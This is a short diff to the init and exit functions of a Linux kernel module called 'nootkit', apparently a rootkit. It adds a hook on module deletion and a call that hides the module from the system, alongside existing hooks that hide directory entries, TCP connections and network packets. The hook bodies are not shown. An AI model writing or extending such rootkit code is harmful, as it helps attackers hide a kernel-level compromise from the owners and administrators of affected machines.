@@ -53,6 +53,10 @@ int nootkit_init(void)
     hide_hook_set_filldir64();
     hide_hook_set_tcp_seq_next();
     hide_hook_set_netif_receive_skb_list_internal();
+    hide_hook_set_delete_module();
+
+    // no need to call unset for this hide, see it's description
+    hide_set_module_this();
 
     return 0;
 }
@@ -64,6 +68,7 @@ void nootkit_exit(void)
     hide_hook_unset_filldir64();
     hide_hook_unset_tcp_seq_next();
     hide_hook_unset_netif_receive_skb_list_internal();
+    hide_hook_unset_delete_module();
 
     printk(KERN_INFO "Unloaded nootkit!\n");
 }
